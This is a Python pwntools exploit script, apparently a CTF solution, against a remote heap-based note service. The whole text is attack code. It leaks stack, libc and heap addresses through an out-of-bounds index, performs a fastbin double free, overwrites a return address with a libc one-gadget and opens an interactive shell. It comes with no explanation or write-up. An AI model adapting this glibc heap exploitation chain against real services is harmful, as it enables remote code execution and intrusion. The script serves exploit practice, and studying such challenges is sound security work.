from pwn import *

r = remote("csie.ctf.tw", 10135)

context.arch = 'amd64'

def new(size,data):
    r.sendlineafter("> ","1")
    r.sendlineafter("size: ",str(size))
    r.sendlineafter("content: ", data)
    return r.recvline()[:-1]

def pprint(idx,s=""):
    r.sendlineafter("> ","2")
    if s == "":
        r.sendlineafter("index: ",str(idx))
    else:
        r.sendlineafter("index: ",s)
    return r.recvline()[:-1]


def delete(idx, s=""):
    r.sendlineafter("> ","3")
    if s == "":
        r.sendlineafter("index: ",str(idx))
    else:
        r.sendlineafter("index: ",s)
    return r.recvline()[:-1]

# leak stack
new(0x58, 'nothing')
new(0x58, 'not yet')
x = int.from_bytes(pprint(-6),'little')
stack = x - 0xb0
print("stack: " + hex(stack))

# leak libc address
x = int.from_bytes(pprint(0, p64(0x35322d) + p64(stack+0xb8)),'little')
libc = x - 240 - 0x20740 
print("libc: " + hex(libc))

# leak heap
x = int.from_bytes(pprint(0, p64(0x35322d) + p64(stack)),'little')
heap = x
print("heap: " + hex(heap))


# double free
delete(0, p64(0x35322d) + p64(heap))
delete(1, p64(0x35322d) + p64(heap+0x60))
delete(0, p64(0x35322d) + p64(heap))

# overwrite the return address
hook_offset = 0x3c4aed
hook = libc + hook_offset
gadget30 = libc + 0x45216
gadget300 = libc + 0x4526a
gadget50 = libc + 0xef6c4
gadget70 = libc + 0xf0567

first = 9
ret = stack - 0x8*(30-first)

new(0x58, flat(ret))
new(0x58, 'not yet')
new(0x58, 'not yet')

# overwrite return address
offset = 0
canary = 0
r.sendlineafter("> ","1")

payload = [0xa3838, canary, 0, 0, libc+offset, canary, libc+offset, stack+offset, 0, libc+offset, 0, heap+offset, stack+offset, 0, 0, libc+offset, 0, stack+offset, stack+offset]

si = payload[:first-1]
si.append(0x61)

r.sendlineafter("size: ", flat(si))

con = payload[first:]
con.append(gadget70)
r.sendlineafter("content: ", flat(con))

r.interactive()
